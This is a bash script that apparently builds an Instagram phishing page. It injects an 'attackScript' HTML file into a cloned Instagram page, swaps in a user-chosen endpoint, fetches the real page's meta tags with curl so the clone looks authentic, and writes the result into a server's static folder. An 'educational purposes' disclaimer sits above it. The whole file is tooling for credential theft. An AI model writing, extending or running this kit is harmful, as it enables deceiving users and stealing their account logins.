#!/bin/bash 

dependencies() {

    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
    command -v node > /dev/null 2>&1 || { echo >&2 "I require node but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m\n"

    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option

    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Add a end point page: \e[0m\en' endpoint

    if [[ $option == 1 ]]; then
        page="Instagram"
        start
    else
        printf "\ninvalid option\n\n"
    fi

}

banner() {

    printf "\e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
    printf "\e[101m\e[1;77m:: responsible for any misuse or damage caused by program.   ::\e[0m\n"
    printf "\e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
    printf "\n"

}

make() {

    attackScript=`cat ./logic/attackScript.html`

    mainScript=`cat ./websites/$page/$page.html`

    attackScriptId="<script type='attackLogic'></script>"
    falseEndId="<meta type='falseEnd'>"

    mainScript="${mainScript/$attackScriptId/$attackScript}"
    mainScript="${mainScript/'<replaceWithPath>'/$endpoint}"

    #start it off
    meta=`echo $mainScript | grep -o -m 1 "<meta[^<]*>" | head -1`

    #while not at end
    while [[ $meta != $falseEndId ]]
    do

        #remove meta
        mainScript="${mainScript/$meta/}"
        meta=`echo $mainScript | grep -o -m 1 "<meta[^<]*>" | head -1`

    done

    falseEndMeta=`curl -s $endpoint`
    falseEndMeta=`echo $falseEndMeta | grep -o "<meta[^<]*>"`
    
    mainScript="${mainScript/$falseEndId/$falseEndMeta}"

    echo $mainScript > "./server/static/index.html"

}


start() {
    make
}

banner
dependencies
menu